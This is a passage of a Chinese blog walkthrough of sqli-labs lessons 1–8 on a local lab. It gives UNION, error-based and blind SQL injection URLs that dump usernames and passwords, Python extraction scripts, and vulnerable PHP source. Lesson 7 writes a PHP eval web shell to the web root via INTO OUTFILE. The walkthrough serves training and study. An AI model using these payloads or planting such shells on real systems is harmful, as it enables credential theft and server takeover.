+<td>以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 nu</td>
+</tr>
+<tr>
+<td>numeric_precision&nbsp;</td>
+<td>近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 null</td>
+</tr>
+<tr>
+<td>numeric_precision_radix&nbsp;</td>
+<td>近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 null</td>
+</tr>
+<tr>
+<td>numeric_scale&nbsp;</td>
+<td>近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 null</td>
+</tr>
+<tr>
+<td>datetime_precision&nbsp;</td>
+<td>datetime 及 sql-92 interval 数据类型的子类型代码。对于其它数据类型，返回 null</td>
+</tr>
+<tr>
+<td>character_set_catalog&nbsp;</td>
+<td>如果列是字符数据或 text 数据类型，那么返回 master，指明字符集所在的数据库。否则，返回 null</td>
+</tr>
+<tr>
+<td>character_set_schema&nbsp;</td>
+<td>如果列是字符数据或 text 数据类型，那么返回 dbo，指明字符集的所有者名称。否则，返回 null</td>
+</tr>
+<tr>
+<td>character_set_name&nbsp;</td>
+<td>如果该列是字符数据或 text 数据类型，那么为字符集返回唯一的名称。否则，返回 null</td>
+</tr>
+<tr>
+<td>collation_catalog&nbsp;</td>
+<td>如果列是字符数据或 text 数据类型，那么返回 master，指明在其中定义排序次序的数据库。否则此列为 null</td>
+</tr>
+<tr>
+<td>collation_schema&nbsp;</td>
+<td>返回 dbo，为字符数据或 text 数据类型指明排序次序的所有者。否则，返回 null</td>
+</tr>
+<tr>
+<td>collation_name&nbsp;</td>
+<td>如果列是字符数据或 text 数据类型，那么为排序次序返回唯一的名称。否则，返回 null。</td>
+</tr>
+<tr>
+<td>domain_catalog&nbsp;</td>
+<td>如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 null</td>
+</tr>
+<tr>
+<td>domain_schema&nbsp;</td>
+<td>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 null</td>
+</tr>
+<tr>
+<td>domain_name&nbsp;</td>
+<td>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL</td>
+</tr>
+</tbody></table>
+<h2 id="【5】查询用户名和密码"><a href="#【5】查询用户名和密码" class="headerlink" title="【5】查询用户名和密码"></a>【5】查询用户名和密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(username) from security.users --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191841804.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(password) from security.users --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191842038.png"></p>
+<h1 id="Lesson-2"><a href="#Lesson-2" class="headerlink" title="Lesson 2"></a>Lesson 2</h1><p><strong>GET - Error based - Intiger based (基于错误的GET整型注入)</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191844993.png"></p>
+<h2 id="【1】查列数-1"><a href="#【1】查列数-1" class="headerlink" title="【1】查列数"></a>【1】查列数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-2/?id=1 and 1=1 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191847592.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-2/?id=1 and 1=1 order by 3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191848031.png"><br>列数为4</p>
+<h2 id="【2】查库名-1"><a href="#【2】查库名-1" class="headerlink" title="【2】查库名"></a>【2】查库名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-2/?id=-1 union select 1,2,database(); --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210191849741.png"></p>
+<h2 id="【3】获取所有表-1"><a href="#【3】获取所有表-1" class="headerlink" title="【3】获取所有表"></a>【3】获取所有表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-2/?id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210192020350.png"></p>
+<h2 id="【4】查询字段-1"><a href="#【4】查询字段-1" class="headerlink" title="【4】查询字段"></a>【4】查询字段</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210192023276.png"></p>
+<h2 id="【5】查询用户名和密码-1"><a href="#【5】查询用户名和密码-1" class="headerlink" title="【5】查询用户名和密码"></a>【5】查询用户名和密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-2/?id=-1 union select 1,2,group_concat(username) from security.users --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210192024117.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-2/?id=-1 union select 1,2,group_concat(password) from security.users --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210192026667.png"></p>
+<h1 id="Lesson-3"><a href="#Lesson-3" class="headerlink" title="Lesson 3"></a>Lesson 3</h1><p><strong>GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201053028.png"><br>尝试用单引号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-3/?id=-1 &#x27; union select 1,2,3 --+ </span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201054955.png"><br>报错了，发现是因为括号没有闭合，那就闭合一下再试一试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,2,3 --+ </span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201056774.png"><br>注入正常，列数与前面相同，直接查库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,database(),3 --+ </span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201058865.png"><br>查表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+ </span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201104209.png"></p>
+<p>查字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+ </span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201103270.png"><br>查数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//username</span><br><span class="line">http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(username) from security.users --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201105107.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//password</span><br><span class="line">http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(password) from security.users --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201106974.png"></p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+<p>可以看到这里的<code>$id</code>是单引号和括号同时包裹起来的，所以payload中不仅要闭合单引号，还要闭合一个左括号，其他的和之前的题目一样</p>
+<h1 id="Lesson-4"><a href="#Lesson-4" class="headerlink" title="Lesson 4"></a>Lesson 4</h1><p><strong>Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201221589.png"><br>看标题是基于双引号的，尝试一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-4/?id=-1&quot; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201222509.png"><br>发现还有个括号，加个括号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-4/?id=-1&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201224775.png"><br>剩下的就和前面的一样了，不再赘述</p>
+<h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="Lesson-5"><a href="#Lesson-5" class="headerlink" title="Lesson 5"></a>Lesson 5</h1><p><strong>GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201651415.png"><br>正常输入看一下回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201813023.png"><br>与前几题不通，开始不显示具体信息了，可以判断是盲注，只能通过返回的状态来判断payload中注入的语句是否正确，尝试查一下列数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201816115.png"><br>有报错，列数为3，接下来查库名，因为是盲注，所以不能指望会显示出返回的信息，只能根据bool型的注入语句看有无回显来猜测库名。<br>首先猜测库名的长度，构造下面的语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and length(database())=1--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201826829.png"><br>一直枚举到8出现回显，说明库名长度为8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and substring(database(),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201820957.png"><br>发现没有显示信息，再尝试以下payload：<br>尝试暴库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and substring(database(),1,1)=&#x27;s&#x27;--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201821976.png"><br>显示了，说明库名的第一个字符为<code>s</code><br>直接写脚本暴库名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://127.0.0.1/Less-5/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_len</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        payload = <span class="string">&quot;?id=1&#x27; and length(database())=&#123;0&#125;--+&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        r = requests.get(URL + payload)</span><br><span class="line">        <span class="keyword">if</span>(r.headers[<span class="string">&#x27;Content-Length&#x27;</span>])!=<span class="string">&#x27;436&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>(<span class="params">length</span>):</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">            char = <span class="built_in">chr</span>(<span class="number">97</span>+j)</span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and substring(database(),&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;--+&quot;</span>.<span class="built_in">format</span>(i,char)</span><br><span class="line">            r = requests.get(URL + payload)</span><br><span class="line">            <span class="keyword">if</span>(r.headers[<span class="string">&#x27;Content-Length&#x27;</span>])!=<span class="string">&#x27;436&#x27;</span>:</span><br><span class="line">                name += char</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(db_name(db_len()))</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<p>执行结果如下：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210201923610.png"><br>表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),1,1)=&#x27;e&#x27;),1,0) --+</span><br></pre></td></tr></table></figure>
+<p>列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,1)=&#x27;i&#x27;),1,0) --+</span><br></pre></td></tr></table></figure>
+<p>用户名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(username) from security.users),1,1)=&#x27;D&#x27;),1,0) --+</span><br></pre></td></tr></table></figure>
+<p>密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(password) from security.users),1,1)=&#x27;D&#x27;),1,0) --+</span><br></pre></td></tr></table></figure>
+<p>表名和列名和数据使用以上对应的payload简单修改程序就可以爆破出来</p>
+<h2 id="xmlupdate报错注入思路"><a href="#xmlupdate报错注入思路" class="headerlink" title="xmlupdate报错注入思路"></a>xmlupdate报错注入思路</h2><p>暴库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211035600.png"><br>暴内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select group_concat(username,0x5e,password) from users),1)),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211039770.png"><br>这里并没有显示完整，问题是报错信息一次只能显示31个字符，将substr里的启示位置每次增加31，就可以将完整的数据暴出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://127.0.0.1/Less-5/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">&quot;?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select\</span></span><br><span class="line"><span class="string">             group_concat(username,0x5e,password) from users),&#123;0&#125;)),\</span></span><br><span class="line"><span class="string">                0x7e),1) --+&quot;</span>.<span class="built_in">format</span>(<span class="number">1</span>+i*<span class="number">31</span>)</span><br><span class="line">        r = requests.get(URL+payload)</span><br><span class="line">        <span class="keyword">if</span> r.headers[<span class="string">&#x27;Content-Length&#x27;</span>]==<span class="string">&#x27;459&#x27;</span>:<span class="keyword">break</span></span><br><span class="line">        html = etree.HTML(r.text)</span><br><span class="line">        result = html.xpath(<span class="string">&#x27;/html/body/div/font[2]/font[1]/text()&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+<p>结果如下：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211107917.png"></p>
+<h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="Lesson-6"><a href="#Lesson-6" class="headerlink" title="Lesson 6"></a>Lesson 6</h1><p><strong>Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</strong><br>除了单引号变为双引号，与第五关没有区别，改一下Lesson5的程序就可以利用了</p>
+<h2 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="Lesson-7"><a href="#Lesson-7" class="headerlink" title="Lesson 7"></a>Lesson 7</h1><p><strong>Dump into outfile - String （导出文件GET字符型注入）</strong><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211648824.png"><br><code>id=1</code>先看一下：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211649467.png"><br>提示用outfile，outfile是mysql中导出数据到文本文件中的语句，如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> passwd <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/password.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>这样会在当前目录下创建一个文件，这里要注意，在SQL注入中利用Outfile，这里的路径只能是网站的绝对路径<br>回到题目，测试后发现能够闭合的payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-7/?id=1&#x27; )) --+</span><br></pre></td></tr></table></figure>
+<p>尝试写入一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Less-7/?id=1&#x27; )) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#x27; into outfile &#x27;/var/www/html/bk.php&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>需要注意的是，由于我的环境是docker，刚开始使用上面的payload写入文件时发现写不进去，查阅资料后发现是缺少权限，就手动给网站目录加了可写权限<br>虽然还是这个界面<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211735412.png"><br>但是在网站目录下已经看到了写入的木马文件<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211736643.png"><br>蚁剑连接：<br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211801750.png"><br><img src="https://gitee.com/n0usss/my-pictures/raw/master/pics/202210211801260.png"></p>
+<h1 id="Lesson-8"><a href="#Lesson-8" class="headerlink" title="Lesson 8"></a>Lesson 8</h1><p><strong>GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</strong><br>布尔型的单引号盲注，爆表方法与Lesson5一样，程序改一下可以直接使用</p>
